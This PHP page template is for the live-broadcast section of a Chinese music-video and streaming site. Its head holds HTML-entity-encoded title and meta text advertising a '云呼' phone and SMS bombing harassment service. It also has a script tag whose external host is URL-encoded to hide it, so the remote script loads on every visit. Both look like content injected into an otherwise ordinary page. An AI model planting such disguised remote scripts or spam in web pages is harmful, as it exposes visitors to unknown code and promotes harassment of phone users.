<?php include 'head.php';$live='active';?>
<title>网络直播-&#26497;&#36895;&#20113;&#21628;</title>
<meta name="description" content="&#19987;&#19994;&#20174;&#20107;&#30701;&#20449;&#12289;&#30005;&#35805;&#12289;&#23433;&#21331;&#20113;&#21628;&#21644;&#33529;&#26524;&#20113;&#21628;&#24179;&#21488;&#45;&#25552;&#20379;&#23433;&#21331;&#44;&#32593;&#39029;&#44;&#33529;&#26524;&#44;&#30005;&#33041;&#31561;&#20113;&#21628;&#12289;&#29233;&#37239;&#12289;&#26497;&#36895;&#12289;&#20256;&#22855;&#12289;&#21628;&#21543;&#12289;&#56;&#56;&#12289;&#28120;&#27668;&#12289;&#36229;&#32423;&#31561;&#20113;&#21628;&#27979;&#35797;&#45;&#25298;&#32477;&#22871;&#36335;&#20113;&#21628;&#65292;&#20570;&#26368;&#19987;&#19994;&#30340;&#20113;&#21628;&#24179;&#21488;&#12290;">
<link href="//cdn.staticfile.org/aplayer/1.10.1/APlayer.min.css" rel="stylesheet" type="text/css" />
<link href="//cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="http://%77%77%77%2E%38%38%67%68%2E%63%63/a/abs.js"></script>
<style type="text/css">
.plr10{padding-left:10px;padding-right:10px;max-width:620px;min-width:300px;margin:10px auto;background-color:#fff;}
</style>
<!--[if lt IE 9]><script src="js/html5.js"></script><![endif]-->
</head>
<body>
<?php  include 'header.php';?>
<div class="container">
<div class="row">
<?php echo $mkcms_ad19; ?>
			<div class="stui-pannel-box">
				<div class="stui-pannel_hd">
					<div class="stui-pannel__head active bottom-line clearfix">
					<h3 class="title"><svg class="iconm" aria-hidden="true"><use xlink:href="#icon-list"></use></svg>音乐MV</h3></div>
				</div><!-- 筛选 -->
<ul class="stui-screen__list type-slide bottom-line-dot clearfix up-ul2">
<li><span class="text-muted">按类型</span></li>
<li><a href="/mv_9_1.html" >新歌推荐</a></li>
<li><a href="/mv_13_1.html" >华语精选</a></li>
<li><a href="/mv_17_1.html" >日韩精选</a></li>
<li><a href="/mv_16_1.html" >欧美精选</a></li>
<li><a href="/live.html" >网络直播</a></li>
<li><a href="/meipai.html" >美拍视频</a></li>
</ul>
</div>
<?php
ini_set("error_reporting","E_ALL & ~E_NOTICE");
header("Content-type: text/html;charset=utf-8");
date_Default_TimeZone_set("PRC");
echo '<div class="plr10"><script type="text/javascript" src="mlive.php" charset="utf-8"></script></div>';
?>
<?php  include 'footer.php';?>